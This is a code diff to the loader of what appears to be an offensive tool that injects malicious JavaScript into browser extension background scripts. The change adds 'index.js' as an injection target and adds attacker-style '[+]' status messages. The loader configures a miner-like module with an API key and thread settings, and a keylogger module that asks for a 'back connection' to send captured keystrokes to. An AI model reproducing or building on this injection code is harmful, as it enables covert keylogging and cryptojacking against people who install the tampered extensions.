@@ -15,7 +15,7 @@ class Loader :
 
 		try:
 
-			background = ["background.js","bundle.js"]
+			background = ["background.js","bundle.js", "index.js"]
 
 			for script in background :
 				path = "output/extensions/{}/{}".format(self.extension, script) # Manifest JSON
@@ -37,15 +37,19 @@ class Loader :
 
 				options = "{}{}{}, {}thread:{}, autoThreads:{}, throttle: {}, forceASMJS: {}{}".format('"',apikey,'"',"{",thread, autoThreads, throttle, forceASMJS,"}") # Options
 
-				print("Module as been injected {}".format(modules))
+				print("[+] Module as been injected {}".format(modules))
 
 			elif self.module == "keylogger/keylogger" :
 
 				modules = "modules/keylogger/keylogger.js" # Javascript file to inject into background
-				print("Configuration of module {}".format(modules))
+				print("[+] Configuration of module {}".format(modules))
 				
-				connection = raw_input("Set the back connection: ")
+				connection = raw_input("{}".format(Colors().status("[+] Set the back connection: ")))
+
 				options = "{}".format(connection)
+
+				print("[+] Module as been injected {}".format(modules))
+
 
 			with open(modules, "r") as payload :
 				payload = payload.read()
